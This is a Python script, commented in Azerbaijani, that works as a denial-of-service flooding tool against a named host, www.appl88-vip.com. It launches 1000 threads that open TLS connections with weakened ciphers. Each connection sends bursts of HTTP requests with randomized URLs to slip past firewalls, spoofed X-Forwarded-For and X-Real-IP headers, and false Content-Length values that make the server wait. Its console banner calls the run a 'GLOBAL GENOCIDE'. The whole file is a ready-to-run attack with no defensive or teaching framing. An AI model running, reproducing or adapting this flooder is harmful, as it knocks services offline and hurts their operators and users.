import socket
import threading
import random
import string
import time
import ssl

# --- ULTRA TARGET ---
TARGET_HOST = "www.appl88-vip.com"
TARGET_PORT = 443
THREADS = 1000 # Maksimum güc

def r_str(n):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def attack():
    # SSL context-i daha 'agressiv' tənzimləyirik
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Şifrələmə metodlarını (ciphers) köhnə saxlayırıq ki, serverin CPU-su onları çözmək üçün daha çox güc sərf etsin
    ctx.set_ciphers('DEFAULT@SECLEVEL=1')

    while True:
        try:
            # TCP bağlantısı
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Paketləri gecikdirmədən dərhal göndər
            s.settimeout(3)
            
            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))
            
            # Bu hissə "Massive Header Bombardment" adlanır
            # Serverin buferini (Buffer) doldurmaq üçün hər bağlantıda 200 ağır paket
            for i in range(200):
                # Hər dəfə URL-i dəyişirik ki, Firewall IP-ni robot kimi tanımasın
                payload = (
                    f"GET /?v={r_str(50)} HTTP/1.1\r\n"
                    f"Host: {TARGET_HOST}\r\n"
                    f"User-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/12{random.randint(0,9)}.0.0.0 Safari/537.36\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
                    f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
                    f"X-Real-IP: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
                    f"Content-Length: {random.randint(1000, 5000)}\r\n" # Serveri datanı gözləməyə məcbur et
                    f"\r\n"
                ).encode()
                
                conn.send(payload)
                # İkinci zərbə: Yarımçıq data göndər
                conn.send(r_str(10).encode())
            
            # Bağlantını bağlama, serverin onu bağlamasını gözlə (Bağlantı limitini doldurur)
            time.sleep(1)
            conn.close()
        except:
            pass

def main():
    print(f"💀 GLOBAL GENOCIDE STARTED: {TARGET_HOST}")
    print("[!] Resource Saturaion: All Threads engaged.")
    
    for i in range(THREADS):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} Heavy Units deployed...")
            time.sleep(0.1)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
